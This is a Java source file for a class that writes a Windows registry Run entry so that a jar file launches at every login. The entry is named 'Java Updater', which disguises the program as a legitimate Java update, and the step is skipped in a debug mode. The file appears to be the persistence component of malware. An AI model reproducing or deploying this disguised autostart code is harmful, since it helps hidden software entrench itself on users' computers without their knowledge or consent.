package syn.utils.reg;

import java.lang.reflect.InvocationTargetException;
import syn.utils.FileUtils;
import syn.utils.Settings;
import syn.utils.Utilities;

public class RegUtils extends Utilities {
	
	public RegUtils() {
		if(!check() && !Settings.debugMode) {
			init();
		}
	}
	
	private boolean check() {
		try {
			String output = RegHandler.readString(RegHandler.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Java Updater");
			if(output != null) { return true; }
		} catch (Exception noRKey) {noRKey.printStackTrace();}
		return false;
	}
	
	private void init() {
		try {
			FileUtils fu = new FileUtils();
			RegHandler.createKey(RegHandler.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run");
			String value = "\"" + System.getProperty("java.home") + "\\bin\\javaw.exe\" -jar " + fu.getNewFile();
			RegHandler.writeStringValue(RegHandler.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Java Updater", value);
		} catch (IllegalArgumentException|IllegalAccessException|InvocationTargetException e) { e.printStackTrace(); }
	}
}
